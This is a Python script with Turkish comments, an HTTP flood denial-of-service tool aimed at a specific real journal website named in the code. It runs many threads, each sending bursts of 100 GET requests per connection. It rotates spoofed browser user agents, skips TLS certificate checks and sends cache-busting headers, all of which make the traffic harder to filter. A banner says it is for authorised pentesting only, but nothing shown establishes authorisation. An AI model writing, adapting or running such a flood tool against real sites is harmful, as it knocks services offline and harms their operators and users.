#!/usr/bin/env python3
"""
ULTRA AGRESIF HTTP FLOOD - MAX PERFORMANS
YALNIZCA YETKILI PENTEST ICIN - TEK MAKINE
"""

import socket
import ssl
import threading
import random
import time
import urllib.parse
import sys

TARGET_URL = "https://ejournal.1001tutorial.com/index/en"

def parse_target(url):
    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    port = 443 if parsed.scheme == "https" else 80
    return host, port, path, parsed.scheme == "https"

host, port, path, use_ssl = parse_target(TARGET_URL)

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
]

def flood(thread_id):
    sent = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            # Her baglantida 100 istek patlat
            for _ in range(100):
                ua = random.choice(UA_LIST)
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Pragma: no-cache\r\n"
                    f"\r\n"
                ).encode()
                
                try:
                    sock.send(req)
                except:
                    break
            
            sock.close()
            sent += 100
            
            if sent % 1000 == 0:
                print(f"[T{thread_id:03d}] {sent} istek gonderildi")
                
        except Exception as e:
            # Hata olursa bekleme yapma, direk yeni baglanti
            pass

print("""
[!] ULTRA AGRESIF HTTP FLOOD
[!] YALNIZCA YETKILI PENTEST ICIN
[!] Hedef: %s
[!] Baslatiliyor... (Ctrl+C durdurur)
""" % TARGET_URL)

# Sistemdeki mantiksal cekirdek sayisina gore thread
import os
thread_count = os.cpu_count() * 20  # Ornegin 8 cekirdek x 20 = 160 thread

for i in range(thread_count):
    threading.Thread(target=flood, args=(i,), daemon=True).start()

# Sonsuz dongu
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Durduruldu.")
    sys.exit(0)  
